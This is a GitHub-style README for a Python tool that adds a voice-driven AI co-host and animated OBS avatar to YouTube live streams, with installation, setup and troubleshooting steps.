# 🎙️ Chuks-YT-Live_AI - Easy AI Co-Host for Live Streams

[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)

## 📋 What is Chuks-YT-Live_AI?

Chuks-YT-Live_AI is a simple tool to add an AI co-host to your live streams. It listens to your voice, talks back using AI, and shows an animated character using OBS. You don’t need to type or control it manually. The app uses fast speech recognition (STT), AI conversations, and text-to-speech (TTS). It’s built on Python and works with popular tools like OBS and YouTube.

This app helps streamers talk with their audience without extra help. The animated avatar reacts in real time. It works smoothly on Windows PCs.

## ⚙️ Main Features

- Real-time speech-to-text (STT) conversion.
- AI conversation powered by a large language model.
- Text-to-speech (TTS) with natural voice.
- Animated avatar display through OBS.
- Supports YouTube live streams.
- Runs locally on your PC with Python backend.

## 🖥️ System Requirements

Make sure your PC fits these specs for the best performance:

- Windows 10 or higher (64-bit recommended).
- CPU: Intel Core i5 or equivalent / AMD Ryzen 5 or better.
- RAM: 8 GB minimum.
- Storage: At least 2 GB free space.
- Internet connection for initial setup and AI model queries.
- OBS Studio installed (version 27 or newer).
- Python 3.8 or later installed.

## 🌐 Topics Covered

This project uses AI, live streaming tech, and Python frameworks:

- AI and machine learning
- Speech-to-text (STT) and text-to-speech (TTS)
- FastAPI web server
- OBS Studio integration
- Real-time voice interaction
- YouTube live streaming

## 🚀 Getting Started With Chuks-YT-Live_AI

Follow these steps to get Chuks-YT-Live_AI running on your Windows PC. No programming needed.

### 1. Download the Application

Visit this page to download the latest version:  
[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)

Look for the newest release or the main project files on the page. Download the ZIP file or installer for Windows if available.

### 2. Extract the Files

If you downloaded a ZIP file:  
- Right-click the file.  
- Choose “Extract All.”  
- Pick a folder where you want the program files.

### 3. Install Python (if needed)

Chuks-YT-Live_AI runs on Python. Check if you have it by opening Command Prompt and typing:

```
python --version
```

If Python is not found or the version is below 3.8, download it here:

https://www.python.org/downloads/windows/

Run the installer and tick the option “Add Python to PATH” before clicking install.

### 4. Install Required Python Packages

After extracting the files, open Command Prompt and navigate to the program folder:

```
cd path\to\Chuks-YT-Live_AI
```

Replace `path\to\Chuks-YT-Live_AI` with your actual folder path.

Run this command to install needed packages:

```
pip install -r requirements.txt
```

This sets up fastAPI, STT, TTS, and other necessary software.

### 5. Prepare OBS Studio

Open OBS Studio on your PC. The animated avatar appears as a video source inside OBS.

- Make sure you have a scene ready for streaming.
- Add a new “Browser” source or video source as directed in the app’s detailed guide (found with the files).
- Set the source URL or path provided by Chuks-YT-Live_AI when the app runs.

### 6. Run the Application

In the command prompt, start the app by running:

```
python main.py
```

This launches the backend server. The app will show a local website address, usually something like `http://localhost:8000`.

Open your web browser and go to that address.

### 7. Connect Your YouTube Stream

Follow the on-screen instructions on the app’s webpage to link your live stream. The AI will listen and respond as you talk.

### 8. Use the AI Co-Host

Speak normally into your mic. The AI will:

- Convert your speech to text.
- Respond with natural voice.
- Animate the avatar on your stream.

Adjust the settings on the app’s webpage as needed.

## 🛠️ Troubleshooting & Tips

- Make sure your microphone is working and set as default in Windows.
- If the animated avatar does not show on OBS, double-check your Browser source settings.
- Restart the app if you see errors or no responses.
- Keep OBS and Python updated to avoid compatibility issues.
- Use headphones to avoid sound feedback loops in your stream.

## 🧩 Extra Settings

The app lets you customize:

- AI voice and speaking speed.
- Avatar appearance and animations.
- Language for speech recognition.
- Volume levels.

Change these in the app’s web interface.

## 🔗 Useful Links

- [Chuks-YT-Live_AI GitHub](https://github.com/mohamedfaro7/Chuks-YT-Live_AI) — Download and see full details.
- [Python Downloads](https://www.python.org/downloads/windows/) — Install Python if missing.
- [OBS Studio](https://obsproject.com/download) — Required for animated avatar.

[![Download Chuks-YT-Live_AI](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/mohamedfaro7/Chuks-YT-Live_AI)